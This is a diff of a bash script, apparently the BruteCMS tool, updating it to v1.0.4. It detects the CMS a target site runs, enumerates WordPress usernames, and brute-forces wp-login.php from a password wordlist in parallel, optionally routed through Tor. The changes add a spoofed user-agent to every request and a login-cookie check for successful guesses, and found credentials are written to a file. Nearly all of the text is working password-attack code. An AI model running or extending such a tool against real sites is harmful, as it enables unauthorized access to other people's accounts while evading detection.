@@ -1,5 +1,5 @@
 #!/bin/bash
-# BruteCMS v1.0.3
+# BruteCMS v1.0.4
 # Github: https://github.com/thelinuxchoice/brutecms
 # Coded by: thelinuxchoice (Don't change noob, read the LICENSE!)
 # Instagram: @thelinuxchoice
@@ -32,7 +32,7 @@ printf "\e[1;77m| ___ \          | |     \e[0m\e[1;92m/  __ \|  \/  |/  ___| \e[
 printf "\e[1;77m| |_/ /_ __ _   _| |_ ___\e[0m\e[1;92m| /  \/| .  . |\ \`--.  \e[0m\n"
 printf "\e[1;77m| ___ \ '__| | | | __/ _ \ \e[0m\e[1;92m|    | |\/| | \`--. \ \e[0m\n"
 printf "\e[1;77m| |_/ / |  | |_| | ||  __/ \e[0m\e[1;92m\__/\| |  | |/\__/ / \e[0m\n"
-printf "\e[1;77m\____/|_|   \__,_|\__\___|\e[0m\e[1;92m\____/\_|  |_/\____/  \e[0m\e[1;77mv1.0.3\e[0m\n"
+printf "\e[1;77m\____/|_|   \__,_|\__\___|\e[0m\e[1;92m\____/\_|  |_/\____/  \e[0m\e[1;77mv1.0.4\e[0m\n"
 printf "\n"
 printf "\e[101m::\e[1;77m CMS BruteForcer coded by: @thelinuxchoice ::\e[0m\n\n"
 printf "\e[1;77m[\e[0m\e[1;92m*\e[0m\e[1;77m] WordPress\e[0m\n"
@@ -110,10 +110,10 @@ checkcmstor() {
 
 printf "\e[1;77m [*] Detecting CMS...\e[0m\n"
 
-checkjoomla=$(curl --socks5-hostname 127.0.0.1:9050 -L -s "$site/administrator/index.php" | grep -o 'joomla\|Joomla!\|script type=\"text javascript\" src=\"media system js mootools.js\"\|com_content' | head -n 1)
-checkwp=$(curl --socks5-hostname 127.0.0.1:9050 -L -s "$site/wp-login.php" | grep -o 'wordpress\|wp-content' | head -n 1)
-checkdrupal=$(curl --socks5-hostname 127.0.0.1:9050 -L -s "$site/user/login" | grep -o 'drupal\|drupal.org\|sites all\|Drupal' | head -n 1)
-checkopencart=$(curl --socks5-hostname 127.0.0.1:9050 -L -s "$site/admin/index.php" | grep -o 'opencart\|Opencart\|route=product\|route=common\|catalog view theme' | head -n 1)
+checkjoomla=$(curl --socks5-hostname 127.0.0.1:9050 -L -s --user-agent '"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801"' "$site/administrator/index.php" | grep -o 'joomla\|Joomla!\|script type=\"text javascript\" src=\"media system js mootools.js\"\|com_content' | head -n 1)
+checkwp=$(curl --socks5-hostname 127.0.0.1:9050 -L -s --user-agent '"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801"' "$site/wp-login.php" | grep -o 'wordpress\|wp-content' | head -n 1)
+checkdrupal=$(curl --socks5-hostname 127.0.0.1:9050 -L -s --user-agent '"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801"' "$site/user/login" | grep -o 'drupal\|drupal.org\|sites all\|Drupal' | head -n 1)
+checkopencart=$(curl --socks5-hostname 127.0.0.1:9050 -L -s --user-agent '"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801"' "$site/admin/index.php" | grep -o 'opencart\|Opencart\|route=product\|route=common\|catalog view theme' | head -n 1)
 
 if [[ $checkjoomla == "joomla" ]] || [[ $checkjoomla == "Joomla!" ]] || [[ $checkjoomla == *'script type="text javascript" src="media system js mootools.js"'* ]] || [[ $checkjoomla == "com_content" ]]; then
 printf "\e[1;92m [*] Joomla detected!\e[0m\n"
@@ -151,7 +151,7 @@ fi
 function wptor() {
 
 cms="wp"
-curl -s --socks5-hostname 127.0.0.1:9050 -c cookiewp1.txt "$site/wp-login.php" > /dev/null 2>&1
+curl -s --socks5-hostname 127.0.0.1:9050 -c cookiewp1.txt --user-agent '"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801"' "$site/wp-login.php" > /dev/null 2>&1
 default_user=$(curl --socks5-hostname 127.0.0.1:9050 -s -L "$site/?author=1" | grep -o "author-.*" | cut -d " " -f1 | head -n 1 | cut -d "-" -f2)
 if [[ "$default_user" == "" ]]; then
 printf "\e[1;93m [!] Can't locate user!\e[0m\n"
@@ -178,7 +178,7 @@ countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
 let token++
 printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $countpass $count_pass $pass
 
-{(trap '' SIGINT && wp=$(curl --socks5-hostname 127.0.0.1:9050 -s -L -b cookiewp1.txt -d 'log='$user'&pwd='$pass'&testcookie=1&rememberme=forever' "$site/wp-login.php" | grep -o "dashboard" | head -n 1 ); if [[ $wp == "dashboard" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.brutecmsWP ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.brutecmsWP \n\e[0m";  kill -1 $$; fi; ) } & done; wait $!;
+{(trap '' SIGINT && wp=$(curl --socks5-hostname 127.0.0.1:9050 -s -L -b cookiewp1.txt --user-agent '"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801"' -d 'log='$user'&pwd='$pass'&testcookie=1&rememberme=forever' "$site/wp-login.php" | grep -o 'dashboard\|wordpress_logged_in' | head -n 1 ); if [[ $wp == "dashboard" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.brutecmsWP ;  printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.brutecmsWP \n\e[0m";  kill -1 $$; elif [[ $wp == *'wordpress_logged_in'* ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.brutecmsWP ;  printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.brutecmsWP \n\e[0m";  kill -1 $$; fi; ) } & done; wait $!;
 
 let startline+=$threads
 let endline+=$threads
@@ -354,7 +354,7 @@ fi
 
 resume_wptor() {
 count_pass=$(wc -l $wl_pass | cut -d " " -f1)
-curl --socks5-hostname 127.0.0.1:9050 -s -c cookiewp1.txt "$site/wp-login.php" > /dev/null 2>&1
+curl --socks5-hostname 127.0.0.1:9050 -s -c cookiewp1.txt --user-agent '"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801"' "$site/wp-login.php" > /dev/null 2>&1
 
 while [ $token -lt $count_pass ]; do
 IFS=$'\n'
@@ -367,7 +367,7 @@ countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
  
 printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $countpass $count_pass $pass
 let token++
-{(trap '' SIGINT && wp=$(curl --socks5-hostname 127.0.0.1:9050 -s -L -b cookiewp1.txt -d 'log='$user'&pwd='$pass'&testcookie=1&rememberme=forever' "$site/wp-login.php" | grep -o "dashboard" | head -n 1 ); if [[ $wp == "dashboard" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.brutecmsWP ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.brutecmsWP \n\e[0m";  kill -1 $$; fi; ) } & done; wait $!;
+{(trap '' SIGINT && wp=$(curl --socks5-hostname 127.0.0.1:9050 -s -L -b cookiewp1.txt --user-agent '"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801"' -d 'log='$user'&pwd='$pass'&testcookie=1&rememberme=forever' "$site/wp-login.php" | grep -o 'dashboard\|wordpress_logged_in' | head -n 1 ); if [[ $wp == "dashboard" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.brutecmsWP ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.brutecmsWP \n\e[0m";  kill -1 $$; elif [[ $wp == *'wordpress_logged_in'* ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.brutecmsWP ;  printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.brutecmsWP \n\e[0m";  kill -1 $$; fi; ) } & done; wait $!;
 let token--
 
 changeip
@@ -498,7 +498,7 @@ fi
 function wp() {
 
 cms="wp"
-curl -s -c cookiewp1.txt "$site/wp-login.php" > /dev/null 2>&1
+curl -s -c cookiewp1.txt --user-agent '"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801"' "$site/wp-login.php" > /dev/null 2>&1
 default_user=$(curl -s -L "$site/?author=1" | grep -o "author-.*" | cut -d " " -f1 | head -n 1 | cut -d "-" -f2)
 if [[ "$default_user" == "" ]]; then
 printf "\e[1;93m [!] Can't locate user!\e[0m\n"
@@ -525,7 +525,7 @@ countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
 let token++
 printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $countpass $count_pass $pass #token
 
-{(trap '' SIGINT && wp=$(curl -s -L -b cookiewp1.txt -d 'log='$user'&pwd='$pass'&testcookie=1&rememberme=forever' "$site/wp-login.php" | grep -o "dashboard" | head -n 1 ); if [[ $wp == "dashboard" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.brutecmsWP ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.brutecmsWP \n\e[0m";  kill -1 $$; fi; ) } & done; wait $!;
+{(trap '' SIGINT && wp=$(curl -s -L -b cookiewp1.txt --user-agent '"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801"' -d 'log='$user'&pwd='$pass'&testcookie=1&rememberme=forever' "$site/wp-login.php" | grep -o 'dashboard\|wordpress_logged_in' | head -n 1 ); if [[ $wp == "dashboard" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.brutecmsWP ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.brutecmsWP \n\e[0m";  kill -1 $$; elif [[ $wp == *'wordpress_logged_in'* ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.brutecmsWP ;  printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.brutecmsWP \n\e[0m";  kill -1 $$; fi; ) } & done; wait $!;
 
 let startline+=$threads
 let endline+=$threads
@@ -630,7 +630,7 @@ exit 1
 
 resume_wp() {
 count_pass=$(wc -l $wl_pass | cut -d " " -f1)
-curl -s -c cookiewp1.txt "$site/wp-login.php" > /dev/null 2>&1
+curl -s -c cookiewp1.txt --user-agent '"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801"' "$site/wp-login.php" > /dev/null 2>&1
 
 while [ $token -lt $count_pass ]; do
 IFS=$'\n'
@@ -643,7 +643,7 @@ countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
  
 printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $countpass $count_pass $pass
 let token++
-{(trap '' SIGINT && wp=$(curl -s -L -b cookiewp1.txt -d 'log='$user'&pwd='$pass'&testcookie=1&rememberme=forever' "$site/wp-login.php" | grep -o "dashboard" | head -n 1 ); if [[ $wp == "dashboard" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.brutecmsWP ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.brutecmsWP \n\e[0m";  kill -1 $$; fi; ) } & done; wait $!;
+{(trap '' SIGINT && wp=$(curl -s -L -b cookiewp1.txt --user-agent '"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801"' -d 'log='$user'&pwd='$pass'&testcookie=1&rememberme=forever' "$site/wp-login.php" | grep -o 'dashboard\|wordpress_logged_in' | head -n 1 ); if [[ $wp == "dashboard" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.brutecmsWP ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.brutecmsWP \n\e[0m";  kill -1 $$; elif [[ $wp == *'wordpress_logged_in'* ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.brutecmsWP ;  printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.brutecmsWP \n\e[0m";  kill -1 $$; fi; ) } & done; wait $!;
 let token--
 
 #changeip
